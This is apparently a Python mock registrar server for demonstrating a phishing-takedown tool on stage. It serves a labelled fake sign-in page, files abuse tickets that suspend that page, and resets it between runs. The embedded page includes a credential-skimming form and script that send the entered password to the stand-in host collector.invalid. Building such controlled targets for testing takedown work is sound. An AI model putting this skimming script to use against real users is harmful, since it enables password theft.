"""A controlled target and its mock registrar, for showing the full loop on stage.

    python -m actor.mock_registrar_server            serves on http://localhost:8099

GET  /site           a harmless lookalike page (410 once suspended)
POST /abuse          files a ticket and suspends the site
GET  /tickets/<id>   the ticket as JSON (the receipt)
POST /reset          brings the site back for the next run
"""
import json
import os
import re
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

SITE = b"""<!doctype html>
<html><head><meta charset="utf-8"><title>Sign in</title></head>
<body style="font-family:sans-serif;max-width:420px;margin:60px auto">
<p style="background:#ffe08a;padding:8px"><b>CONTROLLED TEST TARGET.</b>
This page belongs to the Takedown Orchestrator team. It is not a real login
and it stores nothing.</p>
<h2>Sign in to your account</h2>
<form id="login" method="post" action="https://collector.invalid/save.php">
<input name="email" placeholder="Email" style="display:block;margin:8px 0;width:100%">
<input name="password" type="password" placeholder="Password" style="display:block;margin:8px 0;width:100%">
<button>Sign in</button>
</form>
<script>
// Controlled test content: collector.invalid can never resolve (reserved name).
document.querySelector("#login").addEventListener("submit", async (e) => {
  e.preventDefault();
  const pass = document.querySelector("[name=password]").value;
  await fetch("https://collector.invalid/log", { method: "POST", body: JSON.stringify({ pass }) });
});
</script></body></html>"""


TYPES = {".html": "text/html; charset=utf-8", ".js": "text/javascript; charset=utf-8",
         ".css": "text/css; charset=utf-8"}


class Registrar(ThreadingHTTPServer):
    suspended = False

    def __init__(self, address):
        super().__init__(address, Handler)
        self.tickets = {}


class Handler(BaseHTTPRequestHandler):
    def log_message(self, *args):
        pass

    def _send(self, code, body=b"", content_type="application/json"):
        self.send_response(code)
        self.send_header("Content-Type", content_type)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        if self.command != "HEAD":
            self.wfile.write(body)

    def _json(self, code, data):
        self._send(code, json.dumps(data).encode("utf-8"))

    def _site_file(self):
        """(body, content type) for a /site path, or None. SITE_DIR swaps in other demo pages."""
        name = self.path.split("?")[0][len("/site"):].lstrip("/") or "index.html"
        folder = os.environ.get("SITE_DIR")
        if not folder:
            return (SITE, "text/html; charset=utf-8") if name == "index.html" else None
        path = os.path.join(folder, name)
        if not re.fullmatch(r"[A-Za-z0-9._-]+", name) or not os.path.isfile(path):
            return None
        with open(path, "rb") as handle:
            kind = TYPES.get(os.path.splitext(name)[1], "application/octet-stream")
            return handle.read(), kind

    def do_GET(self):
        if self.path.startswith("/site"):
            found = self._site_file()
            if self.server.suspended:
                self._send(410, b"Suspended by the registrar (controlled test).", "text/plain")
            elif found is None:
                self._send(404, b"Not found.", "text/plain")
            else:
                self._send(200, *found)
        elif self.path.startswith("/tickets/"):
            ticket = self.server.tickets.get(self.path.rsplit("/", 1)[-1])
            self._json(200, ticket) if ticket else self._json(404, {"error": "no such ticket"})
        else:
            self._json(404, {"error": "not found"})

    do_HEAD = do_GET

    def do_POST(self):
        length = int(self.headers.get("Content-Length") or 0)
        raw = self.rfile.read(length) if length else b""
        if self.path == "/reset":
            self.server.suspended = False
            self._json(200, {"result": "site restored"})
        elif self.path == "/collect":
            self._send(204)   # the form posts here; nothing is read or stored
        elif self.path == "/abuse":
            try:
                report = json.loads(raw)
            except ValueError:
                return self._json(400, {"error": "body must be JSON"})
            if not re.fullmatch(r"[0-9a-f]{64}", str(report.get("evidence_sha256", ""))):
                return self._json(400, {"error": "evidence_sha256 missing or malformed"})
            if "/site" not in str(report.get("url", "")):
                return self._json(400, {"error": "url is not hosted here"})
            ticket_id = f"T-{len(self.server.tickets) + 1:04d}"
            base = os.environ.get("PUBLIC_URL", "").rstrip("/") or (
                "http://" + self.headers.get("Host", "localhost"))
            ticket = {"ticket": ticket_id, "result": "site suspended", **report,
                      "receipt_url": f"{base}/tickets/{ticket_id}"}
            self.server.tickets[ticket_id] = ticket
            self.server.suspended = True
            self._json(200, ticket)
        else:
            self._json(404, {"error": "not found"})


def make_server(port: int = 8099, host: str = "127.0.0.1") -> Registrar:
    return Registrar((host, port))


if __name__ == "__main__":
    server = make_server(int(os.environ.get("PORT", "8099")), os.environ.get("HOST", "127.0.0.1"))
    print("controlled target on port %d, path /site  (Ctrl+C to stop)" % server.server_address[1])
    server.serve_forever()
